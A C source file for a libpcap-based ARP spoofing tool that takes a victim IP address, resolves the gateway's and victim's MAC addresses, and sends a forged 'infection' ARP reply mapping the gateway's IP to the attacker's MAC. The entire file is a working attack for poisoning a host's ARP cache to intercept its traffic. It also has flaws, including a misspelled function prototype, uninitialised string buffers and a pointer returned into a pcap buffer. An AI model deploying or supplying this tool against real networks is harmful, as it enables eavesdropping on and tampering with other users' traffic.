#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <pthread.h>
#include <net/if.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <pcap.h>

#define ARPPACKETSIZE 28
#define MACADDRLEN 18
#define IPADDRLEN 16

#pragma pack(push, 1)
struct ETH_Header {
	unsigned char DstMACAddr[6];
	unsigned char SrcMACAddr[6];
	unsigned short EtherType;
#define ETHERTYPEIP  0x0800
#define ETHERTYPEARP 0x0806
};

struct ARP_Header {
	unsigned short HardwareType;
#define HWTETHERNET 1
	unsigned short ProtocolType;
#define PROTOTYPEIP 0x0800
	unsigned char HardwareAddressLength;
	unsigned char ProtocolAddressLength;
#define IPV4SIZE 4
#define MACSIZE 6
	unsigned short OperationCode;
#define OP_REQUEST 1
#define OP_REPLY   2
	unsigned char SourceHardwareAddress[6];
	unsigned int SourceProtocolAddress;
	unsigned char TargetHardwareAddress[6];
	unsigned int TargetProtocolAddress;
};

struct PACKET_Header {
	struct ETH_Header ETH_Packet;
	struct ARP_Header ARP_Packet;
};

struct args {
	char* device;
	unsigned char* DestMACAddrHex;
	unsigned int SourceIPAddr;
};
#pragma pack(pop)

bool GetMyIPAddr(char*, unsigned int*);
bool GetMyMACAddr(char*, unsigned char*);
bool GetMyGatewayIPAddr(char*, unsigned int*);
void SetDefaultARP(struct ARP_Header*, unsigned char*, unsigned int, unsigned char*, unsigned int, int);
void SetDefailtETH(struct ETH_Header*, unsigned char*, unsigned char*);
bool SendInfectionPacket(char*, unsigned char*, unsigned int, unsigned int, unsigned int);
void* RecvInfectionResponse(void*);
int main(int argc, char* argv[]) {
	char MyMACAddrStr[MACADDRLEN] = { 0 }, VictimMACAddrStr[MACADDRLEN] = { 0 }, GatewayMACAddrStr[MACADDRLEN] = { 0 };
	unsigned char MyMACAddrHex[MACSIZE], VictimMACAddrHex[MACSIZE], GatewayMACAddrHex[MACSIZE];
	char MyIPAddrStr[IPADDRLEN], VictimIPAddrStr[IPADDRLEN], GatewayIPAddrStr[IPADDRLEN];
	unsigned int MyIPAddrHex, VictimIPAddrHex, GatewayIPAddrHex;
	char* device, errbuf[PCAP_ERRBUF_SIZE];
	struct in_addr inaddr;

	if (argc < 2) {
		printf("Usage : %s <victim ip>\n", argv[0]);
		return -1;
	}

	// Get Network Interface Name
	device = pcap_lookupdev(errbuf);
	if (device == NULL) {
		printf("error in lookupdev()\n");
		printf("%s\n", errbuf);
		return -1;
	}
	printf("Network Interface : %s\n", device);

	// Get My IP Address
	if (GetMyIPAddr(device, &MyIPAddrHex) == false) {			
		printf("Can't get my IP address\n");								
		return -1;										
	}

	inaddr.s_addr = MyIPAddrHex;
	inet_ntop(AF_INET, &inaddr, MyIPAddrStr, IPADDRLEN);	// Convert to String
							
	// Get My MAC Address
	if (GetMyMACAddr(device, MyMACAddrHex) == false) {
		printf("Can't get my MAC address\n");
		return -1;
	}

	for (int i = 0; i < MACSIZE; i++) 	// Convert to String
		sprintf(MyMACAddrStr, "%s%02x%s", MyMACAddrStr, MyMACAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));

	// Get Gateway's IP Address	
	if (GetMyGatewayIPAddr(device, &GatewayIPAddrHex) == false) {
		printf("Can't get my Gateway IP address\n");
		return -1;
	}
 
	// Get Victim IP Address from argv[1]
	inaddr.s_addr = GatewayIPAddrHex;
	inet_ntop(AF_INET, &inaddr, GatewayIPAddrStr, IPADDRLEN);	// Convert to String

	// Print Information
	printf("My MAC Address : %s\n", MyMACAddrStr);
	printf("My IP Address : %s\n", MyIPAddrStr);
	printf("My Gateway IP Address : %s\n", GatewayIPAddrStr);

	strncpy(VictimIPAddrStr, argv[1], IPADDRLEN);
	VictimIPAddrHex = inet_addr(VictimIPAddrStr);	// Convert to Hex

	if (SendInfectionPacket(device, MyMACAddrHex, MyIPAddrHex, VictimIPAddrHex, GatewayIPAddrHex) == false) {
		printf("Cat't send ARP Infection Packet\n");
		return -1;
	}

	return 0;
}

bool GetMyIPAddr(char* device, unsigned int* IPAddr) {
	struct ifaddrs* ifaddr, *ifa;
	struct sockaddr_in* inaddr;

	if (getifaddrs(&ifaddr) == -1) {
		perror("Error in getifaddrs()\n");
		exit(-1);
	}

	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr == NULL) 
			continue;

		if ((strcmp(ifa->ifa_name, device) == 0) && (ifa->ifa_addr->sa_family == AF_INET)) {
			inaddr = (struct sockaddr_in*)ifa->ifa_addr;
			*IPAddr = inaddr->sin_addr.s_addr;

			freeifaddrs(ifaddr);
			return true;
		}
	}

	freeifaddrs(ifaddr);
	return false;
}

bool GetMyMACAddr(char* device, unsigned char* MACAddr) {
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, device, strlen(device));

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
		memcpy(MACAddr, ifr.ifr_hwaddr.sa_data, MACSIZE);
		close(fd);

		return true;
	}
	close(fd);

	return false;
}

bool GetMyGatewayIPAddr(char* device, unsigned int* GatewayIPAddrHex) {
	char* interface = NULL, *Gateway = NULL;
	char line[100];
	FILE* fp;

	fp = fopen("/proc/net/route", "rt");
	if (fp == NULL) {
		printf("can't open /proc/net/route\n");
		return false;
	}

	while (fgets(line, 100, fp)) {
		interface = strtok(line, "\t");
		if (strcmp(interface, device) != 0) 
			continue;

		for (int i = 0; i < 2; i++) 
			Gateway = strtok(NULL, "\t");

		if (strcmp(Gateway, "00000000") == 0) 
			continue;

		break;
	}
	*GatewayIPAddrHex = strtol(Gateway, NULL, 16);
	fclose(fp);

	return true;
}

void SetDefaultARP(struct ARP_Header* packet, unsigned char* SourceMACAddr, unsigned int SourceIPAddr, unsigned char* DestMACAddr, unsigned int DestIPAddr, int Operation) {
	packet->HardwareType = htons(HWTETHERNET);
	packet->ProtocolType = htons(PROTOTYPEIP);
	packet->HardwareAddressLength = MACSIZE;
	packet->ProtocolAddressLength = IPV4SIZE;
	packet->OperationCode = htons(Operation);
	for (int i = 0; i < MACSIZE; i++) 
		packet->SourceHardwareAddress[i] = SourceMACAddr[i];
	packet->SourceProtocolAddress = SourceIPAddr;
	for (int i = 0; i < MACSIZE; i++)
		packet->TargetHardwareAddress[i] = DestMACAddr[i];
	packet->TargetProtocolAddress = DestIPAddr;
}

void SetDefaultETH(struct ETH_Header* packet, unsigned char* SourceMACAddr, unsigned char* DestMACAddr) {
	for (int i = 0; i < MACSIZE; i++) 
		packet->DstMACAddr[i] = DestMACAddr[i];
	for (int i = 0; i < MACSIZE; i++) 
		packet->SrcMACAddr[i] = SourceMACAddr[i];
	packet->EtherType = htons(ETHERTYPEARP);
}

bool SendInfectionPacket(char* device, unsigned char* MyMACAddrHex, unsigned int MyIPAddrHex, unsigned int VictimIPAddrHex, unsigned int GatewayIPAddrHex) {
	unsigned char ETHBroadCasting[MACSIZE] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }, ARPBroadCasting[MACSIZE] = { 0x00, };
	char GatewayMACAddrStr[MACADDRLEN], VictimMACAddrStr[MACADDRLEN];
	unsigned char *GatewayMACAddrHex, *VictimMACAddrHex;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct PACKET_Header Packet_Victim, Packet_Gateway, Infection;
	struct args pThread_args;
	pthread_t pThread_Gateway, pThread_Victim;
	pcap_t* handle;

	SetDefaultARP(&Packet_Victim.ARP_Packet, MyMACAddrHex, MyIPAddrHex, ARPBroadCasting, VictimIPAddrHex, OP_REQUEST);
	SetDefaultARP(&Packet_Gateway.ARP_Packet, MyMACAddrHex, MyIPAddrHex, ARPBroadCasting, GatewayIPAddrHex, OP_REQUEST);
	SetDefaultETH(&Packet_Victim.ETH_Packet, MyMACAddrHex, ETHBroadCasting);
	SetDefaultETH(&Packet_Gateway.ETH_Packet, MyMACAddrHex, ETHBroadCasting);

	handle = pcap_open_live(device, BUFSIZ, 0, 1000, errbuf);
	if (handle == NULL) {
		printf("error in pcap_open_live()\n");
		printf("%s\n", errbuf);
		return false;
	}

	pThread_args.device = device;
	pThread_args.DestMACAddrHex = MyMACAddrHex;
	pThread_args.SourceIPAddr = GatewayIPAddrHex;
	if (pthread_create(&pThread_Gateway, NULL, RecvInfectionResponse, (void*)&pThread_args) < 0) {
		perror("pthread_create()");
		return false;
	}

	sleep(1);	// for thread

	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Gateway, sizeof(struct PACKET_Header)) != 0) {
		perror("error in pcap_sendpacket()\n");
		return false;
	}
	pthread_join(pThread_Gateway, (void**)&GatewayMACAddrHex);	// wait thread

	for (int i = 0; i < MACSIZE; i++) 
		sprintf(GatewayMACAddrStr, "%s%02x%s", GatewayMACAddrStr, GatewayMACAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
	printf("Gateway MAC Address : %s\n", GatewayMACAddrStr);

	pThread_args.SourceIPAddr = VictimIPAddrHex;
	if (pthread_create(&pThread_Victim, NULL, RecvInfectionResponse, (void*)&pThread_args) < 0) {
		perror("pthread_create()");
		return false;
	}

	sleep(1);	// for thread

	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Victim, sizeof(struct PACKET_Header)) != 0) {
		perror("error in pcap_sendpacket()");
		return false;
	}
	pthread_join(pThread_Victim, (void**)&VictimMACAddrHex);

	for (int i = 0; i < MACSIZE; i++) 
		sprintf(VictimMACAddrStr, "%s%02x%s", VictimMACAddrStr, VictimMACAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
	printf("Victim MAC Address : %s\n", VictimMACAddrStr);

	SetDefaultARP(&Infection.ARP_Packet, MyMACAddrHex, GatewayIPAddrHex, VictimMACAddrHex, VictimIPAddrHex, OP_REPLY);
	SetDefaultETH(&Infection.ETH_Packet, MyMACAddrHex, VictimMACAddrHex);

	if (pcap_sendpacket(handle, (unsigned char*)&Infection, sizeof(struct PACKET_Header)) != 0) {
		perror("error in pcap_sendpacket()");
		return false;
	}

	return true;
}

void* RecvInfectionResponse(void* pThread_args) {
	unsigned char *DestMACAddrHex;
	char* device, errbuf[PCAP_ERRBUF_SIZE];
	unsigned int net, mask, SourceIPAddr;
	int ret;
	struct PACKET_Header* packet;
	struct bpf_program fp;
	pcap_pkthdr* pkthdr;
	pcap_t* handle;

	device = ((struct args*)pThread_args)->device;
	DestMACAddrHex = ((struct args*)pThread_args)->DestMACAddrHex;
	SourceIPAddr = ((struct args*)pThread_args)->SourceIPAddr;
	
	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
		printf("error in lookupnet()\n");
		printf("%s\n", errbuf);
		return (void*)-1;
	}

	handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
	if (handle == NULL) {
		printf("error in pcap_open_live()\n");
		printf("%s\n", errbuf);
		return (void*)-1;
	}
	
	if (pcap_compile(handle, &fp, "ether proto \\arp", 0, net) == -1) {
		printf("compile error\n");
		return (void*)-1;
	}

	if (pcap_setfilter(handle, &fp) == -1) {
		printf("setfilter error\n");
		return (void*)-1;
	}

	while (1) {
		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
		if (ret == 0) 
			continue;
		else if (ret == -1) {
			perror("pcap_next_ex()");
			return (void*)-1;
		}
		
		if ((ntohs(packet->ARP_Packet.OperationCode) == OP_REPLY) && (packet->ARP_Packet.SourceProtocolAddress == SourceIPAddr)) 
			return (void*)packet->ARP_Packet.SourceHardwareAddress;
	}
	return (void*)-1;
}
